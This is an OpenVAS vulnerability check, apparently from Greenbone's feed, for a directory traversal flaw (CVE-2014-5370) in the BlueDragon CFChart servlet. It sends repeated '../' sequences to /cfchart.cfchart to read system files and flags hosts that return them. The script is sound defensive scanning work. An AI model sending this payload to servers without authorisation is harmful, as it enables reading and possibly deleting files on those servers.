###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_bluedragon_cfchart_servlet_dir_trav_vuln.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# BlueDragon CFChart Servlet Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805068");
  script_version("$Revision: 11872 $");
  script_cve_id("CVE-2014-5370");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-05-06 11:43:39 +0530 (Wed, 06 May 2015)");
  script_name("BlueDragon CFChart Servlet Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("BlueDragon/banner");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Apr/49");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/131504");
  script_xref(name:"URL", value:"https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-5370/");

  script_tag(name:"summary", value:"This host is running BlueDragon CFChart
  Servlet and is prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read file or not.");

  script_tag(name:"insight", value:"The flaw is due to the /cfchart.cfchart
  script not properly sanitizing user input, specifically path traversal style
  attacks (e.g. '../'). With a specially crafted request, a remote attacker
  can gain access to or delete arbitrary files.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  remote attackers to download arbitrary files from an affected server and
  to also potentially see those files deleted after retrieval.");

  script_tag(name:"affected", value:"BlueDragon CFChart Servlet 7.1.1.17759");

  script_tag(name:"solution", value:"Upgrade to BlueDragon CFChart Servlet
  7.1.1.18527 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"exploit");

  script_xref(name:"URL", value:"http://www.newatlanta.com/products/bluedragon/index.cfm");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

Banner = get_http_banner(port: http_port);
if(!Banner || "BlueDragon Server" >!< Banner){
  exit(0);
}

files = traversal_files();

foreach file (keys(files)){
  url = "/cfchart.cfchart?" +  crap(data:"../", length:3*15) + files[file];

  if(http_vuln_check(port:http_port, url:url, pattern:file)){
    report = report_vuln_url(port:http_port, url:url);
    security_message(port:http_port, data:report);
    exit(0);
  }
}

exit(99);